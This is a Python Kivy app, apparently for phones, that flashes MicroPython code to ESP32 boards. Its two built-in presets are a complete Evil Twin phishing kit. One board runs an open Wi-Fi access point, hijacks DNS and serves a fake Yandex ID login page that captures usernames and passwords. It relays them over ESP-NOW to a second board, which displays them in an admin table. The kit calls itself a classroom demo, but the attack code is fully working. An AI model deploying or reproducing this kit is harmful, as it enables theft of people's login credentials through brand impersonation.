# -*- coding: utf-8 -*-
import kivy
kivy.require('2.0.0')

from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.button import Button
from kivy.uix.label import Label
from kivy.uix.textinput import TextInput
from kivy.uix.spinner import Spinner
from kivy.clock import Clock

import serial
import serial.tools.list_ports
import threading
import time
import json
import os

DEFAULT_A = '''import network
import socket
import espnow
import gc
import time

wlan = network.WLAN(network.STA_IF)
wlan.active(True)
e = espnow.ESPNow()
e.active(True)

PEER_MAC = b'\\xd8\\x85\\xac\\xcc$\\xe4' 
e.add_peer(PEER_MAC)

SSID = "DEMO_Public_WiFi"
AP_IP = "192.168.4.1"

ap = network.WLAN(network.AP_IF)
ap.active(True)
ap.config(essid=SSID, authmode=network.AUTH_OPEN)
ap.ifconfig((AP_IP, "255.255.255.0", AP_IP, "8.8.8.8"))

HTML_INDEX = """<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Авторизация</title><style>body,html{margin:0;padding:0;width:100%;height:100%;background:#f6f5f3;font-family:-apple-system,Arial,sans-serif;display:flex;justify-content:center;align-items:center;}.card{background:#fff;border-radius:24px;padding:40px 24px;width:100%;max-width:400px;box-sizing:border-box;text-align:center;}.ya-logo{display:flex;align-items:center;justify-content:center;width:44px;height:44px;background:#e61414;border-radius:50%;color:#fff;font-size:24px;font-weight:700;margin:0 auto 20px;}.title{font-size:24px;margin-bottom:24px;font-weight:500;}input{width:100%;padding:18px 16px;border:1px solid rgba(0,0,0,0.12);border-radius:16px;font-size:16px;box-sizing:border-box;margin-bottom:16px;outline:none;}input:focus{border-color:#f33;}.btn{background:#ffcc00;border:none;padding:16px;width:100%;font-size:16px;font-weight:500;border-radius:16px;cursor:pointer;}.rick{display:none;text-align:center;color:white;background:black;position:absolute;top:0;left:0;width:100%;height:100%;flex-direction:column;justify-content:center;align-items:center;}</style></head><body><div id="login-box" class="card"><div class="ya-logo">Я</div><div class="title">Войдите с Яндекс ID</div><form action="/login" method="POST" onsubmit="submitForm(event)"><input type="text" name="username" placeholder="Логин или email" required><input type="password" name="password" placeholder="Введите пароль" required><button type="submit" class="btn">Войти</button></form></div><div id="rick-container" class="rick"><h1 style="color:#ffcc00;">Данные отправлены преподавателю!</h1><p>Это учебный пример атаки Evil Twin.</p></div><script>function submitForm(e){e.preventDefault();fetch('/login',{method:'POST',body:new URLSearchParams(new FormData(e.target))}).then(()=>{document.getElementById('login-box').style.display='none';document.getElementById('rick-container').style.display='flex';});}</script></body></html>"""

dns_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
dns_sock.setblocking(False)
dns_sock.bind(("0.0.0.0", 53))

http_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
http_sock.setblocking(False)
http_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
http_sock.bind(("0.0.0.0", 80))
http_sock.listen(5)

print("Плата А готова!")

while True:
    try:
        data, addr = dns_sock.recvfrom(1024)
        packet = data[:2] + b"\\x81\\x80" + data[4:6] + data[4:6] + b"\\x00\\x00\\x00\\x00" + data[12:] + b"\\xc0\\x0c\\x00\\x01\\x00\\x01\\x00\\x00\\x00\\x3c\\x00\\x04" + bytes(map(int, AP_IP.split(".")))
        dns_sock.sendto(packet, addr)
    except OSError: pass

    try:
        conn, addr = http_sock.accept()
        request = conn.recv(1024).decode('utf-8', 'ignore')
        if "POST /login" in request:
            body = request.split("\\r\\n\\r\\n")[-1]
            user, pwd = "", ""
            for item in body.split("&"):
                if item.startswith("username="): user = item.split("=")[-1]
                if item.startswith("password="): pwd = item.split("=")[-1]
            
            message = "{}|{}".format(user, pwd)
            e.send(PEER_MAC, message.encode('utf-8'))
            conn.send("HTTP/1.1 200 OK\\r\\n\\r\\nOK")
        else:
            response = "HTTP/1.1 200 OK\\r\\nContent-Type: text/html\\r\\n\\r\\n" + HTML_INDEX
            conn.send(response.encode('utf-8'))
        conn.close()
    except OSError: pass
    time.sleep_ms(2)
    gc.collect()
'''

DEFAULT_B = '''import network
import espnow
import socket
import gc
import time

def url_decode(string):
    res = ""
    i = 0
    while i < len(string):
        if string[i] == '%':
            try:
                res += chr(int(string[i+1:i+3], 16))
                i += 3
            except:
                res += string[i]
                i += 1
        elif string[i] == '+':
            res += ' '
            i += 1
        else:
            res += string[i]
            i += 1
    try: return res.encode('latin-1').decode('utf-8')
    except: return res

wlan = network.WLAN(network.STA_IF)
wlan.active(True)
e = espnow.ESPNow()
e.active(True)

ap = network.WLAN(network.AP_IF)
ap.active(True)
ap.config(essid="ADMIN_PANEL_\\xf0\\x9f\\x94\\x92", password="password123", authmode=network.AUTH_WPA_WPA2_PSK)
ap.ifconfig(("192.168.4.1", "255.255.255.0", "192.168.4.1", "8.8.8.8"))

http_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
http_sock.setblocking(False)
http_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
http_sock.bind(("0.0.0.0", 80))
http_sock.listen(5)

logs = []

while True:
    if e.any():
        host, msg = e.recv()
        if msg:
            try:
                data_str = msg.decode('utf-8')
                raw_user, raw_pwd = data_str.split("|")
                user = url_decode(raw_user)
                pwd = url_decode(raw_pwd)
                logs.insert(0, {"user": user, "pwd": pwd})
                if len(logs) > 20: logs.pop()
                print("🚨 [ПЕРЕХВАТ]", user, pwd)
            except: pass

    try:
        conn, addr = http_sock.accept()
        try:
            conn.settimeout(0.2)
            request = conn.recv(1024).decode('utf-8', 'ignore')
            html_table = ""
            for log in logs:
                html_table += "<tr><td><b>{}</b></td><td><code>{}</code></td></tr>".format(log["user"], log["pwd"])
            if not html_table: html_table = "<tr><td colspan='2'>Логи пусты...</td></tr>"
            
            HTML_ADMIN = """<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Панель</title><style>body{font-family:sans-serif;background:#121212;color:#fff;padding:20px;}h2{color:#ffcc00;}table{width:100%;border-collapse:collapse;background:#1e1e1e;}th,td{padding:12px;text-align:left;border-bottom:1px solid #2d2d2d;}th{color:#ffcc00;}.btn{background:#ffcc00;padding:10px;width:100%;font-weight:bold;margin-bottom:15px;border:none;border-radius:5px;cursor:pointer;}</style></head><body><h2>📊 Панель управления</h2><button class="btn" onclick="location.reload()">🔄 Обновить</button><table><tr><th>👤 Логин</th><th>🔑 Пароль</th></tr>""" + html_table + """</table></body></html>"""
            response = "HTTP/1.1 200 OK\\r\\nContent-Type: text/html; charset=utf-8\\r\\nConnection: close\\r\\n\\r\\n" + HTML_ADMIN
            conn.send(response.encode('utf-8'))
        except OSError: pass
        finally: conn.close()
    except OSError: pass
    time.sleep_ms(10)
    gc.collect()
'''

class FlashAppLayout(BoxLayout):
    def __init__(self, **kwargs):
        super(FlashAppLayout, self).__init__(**kwargs)
        self.orientation = 'vertical'
        self.padding = 15
        self.spacing = 10
        self.custom_codes_file = "user_codes.json"
        self.user_presets = self.load_user_presets()

        self.label_status = Label(text="Статус: Ожидание подключения ESP32 по USB", size_hint_y=None, height=40, font_size=14)
        self.add_widget(self.label_status)

        spinner_values = ["Плата А (Ловушка)", "Плата Б (Шлюз)"] + list(self.user_presets.keys())
        self.preset_spinner = Spinner(text="Выбрать пресет кода...", values=spinner_values, size_hint_y=None, height=50)
        self.preset_spinner.bind(text=self.on_preset_change)
        self.add_widget(self.preset_spinner)

        self.code_input = TextInput(text="", font_size=12, background_color=(0.1, 0.1, 0.1, 1), foreground_color=(0, 1, 0, 1), multiline=True)
        self.add_widget(self.code_input)

        save_layout = BoxLayout(orientation='horizontal', size_hint_y=None, height=50, spacing=10)
        self.save_name_input = TextInput(text="", placeholder_text="Имя нового пресета", multiline=False)
        btn_save = Button(text="💾 Сохранить пресет", on_press=self.save_current_code)
        save_layout.add_widget(self.save_name_input)
        save_layout.add_widget(btn_save)
        self.add_widget(save_layout)

        lib_layout = BoxLayout(orientation='horizontal', size_hint_y=None, height=50, spacing=10)
        self.lib_name_input = TextInput(text="", placeholder_text="Имя библиотеки", multiline=False)
        btn_download_lib = Button(text="📥 Скачать библиотеку", on_press=self.start_lib_download_thread)
        lib_layout.add_widget(self.lib_name_input)
        lib_layout.add_widget(btn_download_lib)
        self.add_widget(lib_layout)

        self.btn_flash = Button(text="⚡ ЗАПИСАТЬ main.py В ESP32", size_hint_y=None, height=60, font_size=16, background_color=(1, 0.6, 0, 1))
        self.btn_flash.bind(on_press=self.start_flash_thread)
        self.add_widget(self.btn_flash)

    def load_user_presets(self):
        if os.path.exists(self.custom_codes_file):
            try:
                with open(self.custom_codes_file, "r", encoding="utf-8") as f:
                    return json.load(f)
            except:
                return {}
        return {}

    def save_current_code(self, instance):
        name = self.save_name_input.text.strip()
        code = self.code_input.text
        if not name:
            self.label_status.text = "Ошибка: Введите имя пресета!"
            return
        self.user_presets[name] = code
        with open(self.custom_codes_file, "w", encoding="utf-8") as f:
            json.dump(self.user_presets, f, ensure_ascii=False)
        self.preset_spinner.values = ["Плата А (Ловушка)", "Плата Б (Шлюз)"] + list(self.user_presets.keys())
        self.save_name_input.text = ""
        self.label_status.text = f"Пресет '{name}' сохранен в память!"

    def on_preset_change(self, spinner, text):
        if text == "Плата А (Ловушка)":
            self.code_input.text = DEFAULT_A
        elif text == "Плата Б (Шлюз)":
            self.code_input.text = DEFAULT_B
        elif text in self.user_presets:
            self.code_input.text = self.user_presets[text]

    def log_status(self, text):
        self.label_status.text = f"Статус: {text}"

    def start_flash_thread(self, instance):
        threading.Thread(target=self.flash_process).start()

    def start_lib_download_thread(self, instance):
        threading.Thread(target=self.lib_download_process).start()

    def find_serial_port(self):
        ports = list(serial.tools.list_ports.comports())
        if not ports:
            return None
        return ports[0].device

    def flash_process(self):
        Clock.schedule_once(lambda dt: self.log_status("Поиск USB устройства..."))
        target_port = self.find_serial_port()
        if not target_port:
            Clock.schedule_once(lambda dt: self.log_status("Ошибка: Плата не найдена! Проверьте OTG кабель."))
            return
        
        Clock.schedule_once(lambda dt: self.log_status(f"Подключение к {target_port}..."))
        try:
            ser = serial.Serial(target_port, 115200, timeout=2)
            time.sleep(0.5)
            ser.write(b'\x03\x03')
            time.sleep(0.3)
            
            Clock.schedule_once(lambda dt: self.log_status("Запись файла main.py..."))
            # Используем тройные кавычки для безопасной передачи многострочного кода
            header = "with open('main.py', 'w', encoding='utf-8') as f: f.write('''\n"
            footer = "\n''')"
            
            full_payload = header + self.code_input.text + footer
            
            # Отправка чанками для стабильности на Android Serial
            chunk_size = 512
            for i in range(0, len(full_payload), chunk_size):
                ser.write(full_payload[i:i+chunk_size].encode('utf-8'))
                time.sleep(0.05) # Небольшая пауза между чанками
                
            time.sleep(0.3)
            ser.write(b'\x04')
            ser.close()
            Clock.schedule_once(lambda dt: self.log_status("⚡ КОД УСПЕШНО ЗАПИСАН В ESP32!"))
        except Exception as ex:
            Clock.schedule_once(lambda dt: self.log_status(f"Ошибка: {str(ex)}"))

    def lib_download_process(self):
        lib_name = self.lib_name_input.text.strip()
        if not lib_name:
            Clock.schedule_once(lambda dt: self.log_status("Ошибка: Укажите имя библиотеки!"))
            return
        
        Clock.schedule_once(lambda dt: self.log_status(f"Поиск USB для установки {lib_name}..."))
        target_port = self.find_serial_port()
        if not target_port:
            Clock.schedule_once(lambda dt: self.log_status("Ошибка: Плата не найдена!"))
            return
        
        Clock.schedule_once(lambda dt: self.log_status("Запуск менеджера пакетов mip на плате..."))
        try:
            ser = serial.Serial(target_port, 115200, timeout=5)
            time.sleep(0.5)
            ser.write(b'\x03\x03')
            time.sleep(0.5)
            cmd = f"import mip; mip.install('{lib_name}')\r\n"
            ser.write(cmd.encode('utf-8'))
            time.sleep(4)
            ser.write(b'\x04')
            ser.close()
            Clock.schedule_once(lambda dt: self.log_status(f"✅ Запрос на установку '{lib_name}' выполнен!"))
        except Exception as ex:
            Clock.schedule_once(lambda dt: self.log_status(f"Ошибка: {str(ex)}"))

class ESP32FlasherApp(App):
    def build(self):
        return FlashAppLayout()

if __name__ == '__main__':
    ESP32FlasherApp().run()